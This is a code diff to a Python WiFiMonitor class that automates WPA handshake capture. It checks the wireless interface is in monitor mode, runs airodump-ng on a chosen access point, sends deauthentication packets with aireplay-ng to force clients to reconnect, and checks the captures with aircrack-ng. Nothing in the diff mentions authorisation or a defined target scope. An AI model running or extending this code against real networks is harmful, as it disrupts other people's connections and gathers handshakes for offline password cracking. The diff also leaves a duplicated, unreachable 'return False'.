@@ -305,58 +305,100 @@ class WiFiMonitor:
     def _start_handshake_capture(self, bssid: str, ssid: str, channel: int):
         """Start capturing handshake for a network"""
         try:
-            capture_file = os.path.join(self.handshake_dir, f"{bssid.replace(':', '')}.cap")
+            # Create unique filename
+            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+            bssid_clean = bssid.replace(':', '')
+            capture_base = os.path.join(self.handshake_dir, f"{bssid_clean}_{timestamp}")
+            
+            logger.info(f"⚡ Starting handshake capture for {ssid} ({bssid}) on channel {channel}")
+            
+            # Test if attack interface is in monitor mode
+            result = subprocess.run(['iw', 'dev', self.attack_interface, 'info'],
+                                  capture_output=True, text=True)
+            if 'type monitor' not in result.stdout:
+                logger.error(f"{self.attack_interface} is not in monitor mode!")
+                return
             
             # Start airodump-ng to capture handshake
             cmd = [
                 'airodump-ng',
                 '--bssid', bssid,
                 '--channel', str(channel),
-                '--write', capture_file,
-                '--output-format', 'cap',
+                '--write', capture_base,
+                '--output-format', 'pcap',
                 self.attack_interface
             ]
             
-            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            logger.debug(f"Running: {' '.join(cmd)}")
+            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            
+            # Wait a moment and check if process started successfully
+            time.sleep(2)
+            if process.poll() is not None:
+                stdout, stderr = process.communicate()
+                logger.error(f"airodump-ng failed to start: {stderr.decode()}")
+                return
+            
+            # airodump-ng creates files like: basename-01.pcap
+            capture_file = capture_base + '-01.pcap'
             
             self.active_captures[bssid] = {
                 'ssid': ssid,
                 'channel': channel,
                 'process': process,
-                'capture_file': capture_file + '-01.cap',  # airodump-ng adds -01
+                'capture_file': capture_file,
+                'capture_base': capture_base,
                 'start_time': time.time(),
-                'eapol_count': 0
+                'deauth_sent': False
             }
             
-            logger.info(f"Started handshake capture for {ssid} ({bssid})")
+            logger.info(f"✓ Capture started for {ssid} - file: {os.path.basename(capture_file)}")
             
-            # Send deauth packets to force handshake
+            # Send deauth packets after a delay to force handshake
             threading.Thread(target=self._send_deauth, args=(bssid, channel), daemon=True).start()
         
         except Exception as e:
             logger.error(f"Failed to start handshake capture for {bssid}: {e}")
+            import traceback
+            logger.debug(traceback.format_exc())
     
     def _send_deauth(self, bssid: str, channel: int):
         """Send deauth packets to trigger handshake"""
         try:
-            # Wait a bit before deauthing
+            # Wait for airodump-ng to start capturing
             time.sleep(5)
             
+            if bssid not in self.active_captures:
+                return
+            
+            capture_info = self.active_captures[bssid]
+            ssid = capture_info['ssid']
+            
+            logger.info(f"💥 Sending deauth packets to {ssid} ({bssid})...")
+            
             # Send deauth packets
-            subprocess.run([
+            result = subprocess.run([
                 'aireplay-ng',
-                '--deauth', '10',
+                '--deauth', '5',
                 '-a', bssid,
                 self.attack_interface
-            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
+            ], capture_output=True, text=True, timeout=30)
             
-            logger.info(f"Sent deauth packets to {bssid}")
+            if result.returncode == 0:
+                logger.info(f"✓ Deauth sent to {ssid}")
+                capture_info['deauth_sent'] = True
+            else:
+                logger.warning(f"Deauth failed for {ssid}: {result.stderr}")
         
+        except subprocess.TimeoutExpired:
+            logger.warning(f"Deauth timeout for {bssid}")
         except Exception as e:
-            logger.debug(f"Deauth error for {bssid}: {e}")
+            logger.error(f"Deauth error for {bssid}: {e}")
     
     def _capture_monitor(self):
         """Monitor active captures and finalize timeouts"""
+        logger.info("Capture monitor thread started")
+        
         while self.running:
             try:
                 current_time = time.time()
@@ -364,28 +406,50 @@ class WiFiMonitor:
                 for bssid in list(self.active_captures.keys()):
                     capture_info = self.active_captures[bssid]
                     elapsed = current_time - capture_info['start_time']
+                    ssid = capture_info['ssid']
                     
-                    if elapsed > self.handshake_timeout:
-                        # Check if handshake was captured
+                    # Check periodically for handshake (every 30 seconds after deauth)
+                    if capture_info.get('deauth_sent') and elapsed > 30 and elapsed % 30 < 10:
+                        logger.debug(f"Checking for handshake in {ssid} capture...")
                         if self._verify_handshake(capture_info['capture_file']):
+                            logger.info(f"🎯 Handshake captured for {ssid}!")
+                            self._finalize_handshake(bssid)
+                            continue
+                    
+                    # Timeout after configured duration
+                    if elapsed > self.handshake_timeout:
+                        logger.info(f"⏱️  Capture timeout for {ssid} ({int(elapsed)}s)")
+                        # Final check
+                        if self._verify_handshake(capture_info['capture_file']):
+                            logger.info(f"🎯 Handshake captured for {ssid}!")
                             self._finalize_handshake(bssid)
                         else:
-                            logger.warning(f"Handshake capture timeout for {capture_info['ssid']}")
+                            logger.warning(f"❌ No handshake captured for {ssid}")
                             self._stop_capture(bssid)
                 
                 time.sleep(10)
             
             except Exception as e:
                 logger.error(f"Capture monitor error: {e}")
+                import traceback
+                logger.debug(traceback.format_exc())
                 time.sleep(5)
     
     def _verify_handshake(self, capture_file: str) -> bool:
         """Verify if capture file contains valid handshake"""
         if not os.path.exists(capture_file):
+            logger.debug(f"Capture file doesn't exist: {capture_file}")
+            return False
+        
+        # Check file size
+        file_size = os.path.getsize(capture_file)
+        if file_size < 1000:
+            logger.debug(f"Capture file too small: {file_size} bytes")
             return False
         
         try:
             # Use aircrack-ng to verify handshake
+            logger.debug(f"Verifying handshake in {os.path.basename(capture_file)}...")
             result = subprocess.run(
                 ['aircrack-ng', capture_file],
                 capture_output=True,
@@ -393,11 +457,22 @@ class WiFiMonitor:
                 timeout=10
             )
             
-            # Check if handshake is present in output
-            return 'handshake' in result.stdout.lower()
+            output = result.stdout.lower()
+            
+            # Check for handshake indicators
+            if '1 handshake' in output or 'handshake' in output:
+                logger.info(f"✓ Valid handshake found in {os.path.basename(capture_file)}")
+                return True
+            
+            logger.debug(f"No handshake found in {os.path.basename(capture_file)}")
+            return False
         
+        except subprocess.TimeoutExpired:
+            logger.warning(f"Handshake verification timeout for {capture_file}")
+            return False
         except Exception as e:
-            logger.debug(f"Handshake verification error: {e}")
+            logger.error(f"Handshake verification error: {e}")
+            return False
             return False
     
     def _finalize_handshake(self, bssid: str):
